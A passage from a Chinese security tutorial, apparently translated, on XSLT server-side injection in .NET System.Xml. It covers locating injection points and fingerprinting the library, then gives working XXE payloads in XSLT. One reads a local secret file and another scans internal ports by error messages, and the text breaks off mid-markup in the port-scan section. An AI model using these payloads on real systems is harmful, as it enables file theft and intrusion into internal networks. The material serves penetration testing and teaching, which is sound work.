---
title: XSLT 服务端注入攻击
author: hesir
wechat_source: >-
  http://mp.weixin.qq.com/s?timestamp=1512886045&src=3&ver=1&signature=0dsH*cvrb7sDcdE*f0PtKJTfSmWmpGSr1bt6eLQusWUeX1D3PeY-hy0sLVqqzj8ewzefSEoH9llGPntsMnS0FIKMmDeGcGLmapBR446RN5fzYue*AVLrZE9uHepPAMYFY7RrunWBnGvy1sLLtXBFrY2fMoYD05LwvFo4HtaRyXQ=
date: '2017-12-05 00:00:00 +0000'

---

{% raw  %}
<h1 style="margin-left: 8px;margin-right: 8px;"><br></h1><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GlWVRaibwJzM4abyJfpkymuDGHMsFaoRqdQYpOfDgRXb9ic4ZO8v7ZyfnFTPqftSFicFfu8FwUiaRNOw/0?wx_fmt=jpeg" style="width: 540px !important; height: 300.946px !important;"></p><p style="margin-left: 8px;margin-right: 8px;"><br></p><h1 style="margin-left: 8px;margin-right: 8px;"><strong><span style="letter-spacing: 2px;color: rgb(0, 81, 171);font-size: 18px;">前言</span></strong></h1><hr><p><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">XSLT</span><span style="font-size: 15px;letter-spacing: 2px;">(扩展样式表转换语言)</span><span style="font-size: 15px;letter-spacing: 2px;">漏洞可能会给那些受到影响的应用带来严重的后果，经常会导致远程代码执行。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">举几个已被公开的 XSLT 远程代码执行漏洞的例子，</span><span style="font-size: 15px;letter-spacing: 2px;">CVE-2012-5357</span><span style="font-size: 15px;letter-spacing: 2px;"> 影响了 .NET Ektron CMS；</span><span style="font-size: 15px;letter-spacing: 2px;">CVE-2012-1592</span><span style="font-size: 15px;letter-spacing: 2px;"> 影响了Apache Struts 2.0；</span><span style="font-size: 15px;letter-spacing: 2px;">CVE-2005-3757</span><span style="font-size: 15px;letter-spacing: 2px;"> 影响了 Google 搜索应用。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">从上面的例子可以看出，XSLT 漏洞可谓是由来已久，但是它并不像一些类似的漏洞(例如 XML 漏洞)那样常见。尽管我们经常在我们的安全评估中看到它的身影，但是有关该漏洞及其相关利用技术的文章却并不多见。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">本文将通过展示一些经过精心挑选的
 XSLT 
攻击来说明这种技术以不安全的方式使用时所存在的风险。例如：远程执行任意代码、窃取远程系统数据、执行网络端口扫描以及获取受害者内部网络资源。本文还会提供一个简单的易受攻击的
 .NET 应用，可用于练习本文中所展示攻击，最后提供几条规避 XSLT 漏洞的建议。<br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><h1 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">什么是 XSLT ？</span></strong></span></h1><hr><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">XSLT（扩展样式表转换语言）是一种对 XML 文档进行转化的语言。XML 文档通过 XSLT 转化后可以变成为另一份不同的 XML 文档，或者其他类型的文档，例如 HTML 文档、 CSV 文件、纯文本文件等。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">XSLT 通常用于转换被不同应用加工过的文件格式，还有就是作为一个模板引擎。许多企业级应用广泛地使用了 XSLT ，例如一个多租户发票应用可能会允许客户使用 XSLT 来高度定制他们的发票，比如根据自己的特殊需要来改变发票内容和发票格式。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">其他一些常见的 XSLT 应用场景：</span></p><ul style="margin-left: 8px;margin-right: 8px;" class=" list-paddingleft-2"><li><p><span style="font-size: 15px;letter-spacing: 2px;">报道</span></p></li><li><p><span style="font-size: 15px;letter-spacing: 2px;">将数据以不同的格式导出</span></p></li><li><p><span style="font-size: 15px;letter-spacing: 2px;">打印</span></p></li><li><p><span style="font-size: 15px;letter-spacing: 2px;">发邮件</span></p></li></ul><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">在展示攻击之前，我们不妨先通过一个简单的例子看看这个转化到底是怎么回事。以下面这段包含了一些水果名及相关介绍的 XML 文档为例。</span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version="1.0" ?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;fruits&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;fruit&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;name&gt;Lemon&lt;/name&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;Yellow and sour&lt;/description&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/fruit&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;fruit&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;name&gt;Watermelon&lt;/name&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;Round, green outside, red inside&lt;/description&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/fruit&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/fruits&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">为了将该 XML 文档转化为纯文本文档，可使用如下 XSL 文档：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:template match="/fruits"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Fruits:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Loop for each fruit --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:for-each select="fruit"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Print name: description --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xsl:for-each&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">转换结果如下：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">Fruits:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- Lemon: Yellow and sour</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- Watermelon: Round, green outside, red inside</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">（译注：可参考</span><span style="font-size: 15px;letter-spacing: 2px;">XSLT - 转换</span><span style="font-size: 15px;letter-spacing: 2px;">）<br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><h1 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">XSLT 服务端注入攻击</span></strong></span></h1><hr><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">本部分会展示一套测试应用是否存在 XSLT 漏洞的方法，覆盖了从发现到利用的全过程。例子是一个使用微软 System.Xml XSLT 实现的易受攻击的应用。类似的技术同样可应用于一些其他的常见的库，如 Libxslt 、 Saxon 、 Xalan 。</span></p><h2 style="margin-left: 8px;margin-right: 8px;"><br><span style="font-size: 15px;letter-spacing: 2px;"></span></h2><h2 style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">找到切入点</span></h2><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">第一步是定位应用可能存在漏洞的地方。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">最简单的情景就是应用允许用户上传任意
 XSLT 文件。如果上述情景不存在，一个易受攻击的应用可能会使用不可信的用户输入动态地生成 XSLT 文档。例如，该应用可能会生成如下的 
XSLT 文档，字符串"Your Company Name Here"这里对应的就是不可信的用户输入。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:template match="/fruits"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Your Company Name Here</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Fruits:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Loop for each fruit --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:for-each select="fruit"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Print name: description --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xsl:for-each&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:include href="external_transform.xslt"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">为了验证该应用是否是易受攻击的，我们通常会插入一些会导致 XML 文件语法错误的字符，例如双引号、单引号和尖括号{", ', &lt;, 
&gt;}。如果服务器会返回错误，那么这个应用就有可能是易受攻击的。一般而言，这种定位技术与定位 XML 注入漏洞的技术类似。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">后面将要提到的攻击中有一些仅在文件的特定区域注入时才有效。不过别担心，本文也会展示一种利用 import 和 include 功能来绕开这种限制的技术。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">为了使文章简单易懂，除非另有说明，在接下来的例子中我们将假设我们可以向应用提交任意的 XSLT 文档。</span></p><h2 style="margin-left: 8px;margin-right: 8px;"><br></h2><p><br></p><h2 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">使用 system-property() 函数提取指纹</span></strong></span></h2><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">一旦找到了攻击切入点，接下来提取系统指纹和明确应用正在使用的 XSLT 库是非常有必要的。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">在进行攻击之前，如果知晓了应用所使用的
 XSLT 库是十分有用地。因为不同的库支持的 XSLT 
功能不同，所以可能存在这样的情况，一个功能在这个库中是可以使用的，但是换成另一个库中却无法使用了。专有扩展通常都不支持库间兼容。此外，不同的库的默认设置可能存在较大差异，通常来说，旧的库会默认启用一些存在风险的功能，但是新的库则要求开发者在需要时手动开启这些功能。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">使用 system-property() 函数可以查出一个库的供应商名称，这是 XSLT v1.0 标准的一部分，所有的库都支持该功能。该函数有效的参数有：</span></p><ul style="margin-left: 8px;margin-right: 8px;" class=" list-paddingleft-2"><li><p><span style="font-size: 15px;letter-spacing: 2px;">xsl:vendor</span></p></li><li><p><span style="font-size: 15px;letter-spacing: 2px;">xsl:vendor-url</span></p></li><li><p><span style="font-size: 15px;letter-spacing: 2px;">xsl:version</span></p></li></ul><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">下面的 XSL 文档可用于查出库的供应商：</span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:template match="/fruits"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:value-of select="system-property('xsl:vendor')"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">由于本文的被测试应用使用的是 .NET System.xml ，因此返回值是 Microsoft 。</span></p><h2 style="margin-left: 8px;margin-right: 8px;"><br></h2><p><br></p><h2 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong><span style="font-size: 16px;letter-spacing: 2px;">使用 XML 外部实体(XXE)窃取信息、扫描端口</span></strong></span></h2><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">由于 XSLT 所使用的文件格式是 XML ，那么常见的针对 XML 
的攻击，例如十亿笑攻击(也称 XML 炸弹)和 XML 外部实体攻击，也会影响到 XSLT 
就不足为奇了。十亿笑攻击是一种拒绝服务攻击，其目的在于耗尽服务器的内存资源。为了更契合主题，本文采用的是 XML 外部实体攻击。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">在下面的例子中，我们使用了一个外部实体读取 "C:\secretfruit.txt" 文件中的内容。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "C:\secretfruit.txt"&gt;]&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:template match="/fruits"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Fruits &amp;ext_file;:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Loop for each fruit --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:for-each select="fruit"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Print name: description --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xsl:for-each&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">ENTITY 元素放置的是 "ext_file" 所引用的文件中的内容，也就是我们接下来使用语法 "&amp;ext_file" 打印到主文档中的内容。从输出结果可以看出该文件中的秘密内容就是 "Golden Apple" ：</span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">Fruits Golden Apple:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- Lemon: Yellow and sour</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- Watermelon: Round, green outside, red inside</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">这项技术可被用来取出存储在 Web 服务器上的文件，或者那些正常情况下攻击者无法访问的内部网络的网页，而这些文件有可能是包含身份信息的配置文件或者包含其他敏感信息的文件。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">对于那些可以从受害者内部网络中的其他系统中取出的文件，攻击者也可以使用 </span><span style="font-size: 15px;letter-spacing: 2px;">UNC 路径</span><span style="font-size: 15px;letter-spacing: 2px;"> {\\servername\share\file} 或者 URL {</span><span style="font-size: 15px;letter-spacing: 2px;">http://servername/file}</span><span style="font-size: 15px;letter-spacing: 2px;"> 来代替文件路径。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">使用一些 IP 地址和端口号或许还能查出一个远程端口是打开状态还是关闭状态，不过这一点取决于应用是如何应答的，比方说应用可以返回不同种类的错误信息或者在应答中显示时延信息。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">下面的 XSLT 文档使用了 URL </span><span style="font-size: 15px;letter-spacing: 2px;">http://172.16.132.1:25</span><span style="font-size: 15px;letter-spacing: 2px;"> ：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "http://172.16.132.1:25"&gt;]&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:template match="/fruits"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;Fruits &amp;ext_file;:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Loop for each fruit --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:for-each select="fruit"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Print name: description --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xsl:for-each&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">下图展示了当我们试图连接到该 URL 时，应用返回的错误信息。透过该错误信息不难推断出25号端口处于关闭状态。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GlWVRaibwJzM4abyJfpkymuEfl85721oJ19NT4CcVib50LajibichVvI5BicFQzezmHov7RFJvCoQg4fA/0?wx_fmt=png" style="width: 640px !important; height: 150px !important;"></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"></span><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">当我们使用 </span><span style="font-size: 15px;letter-spacing: 2px;">http://172.16.132.1:1234</span><span style="font-size: 15px;letter-spacing: 2px;"> 时，应用返回了不同的错误信息，透过该错误信息可以推断出1234号端口处于打开状态。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 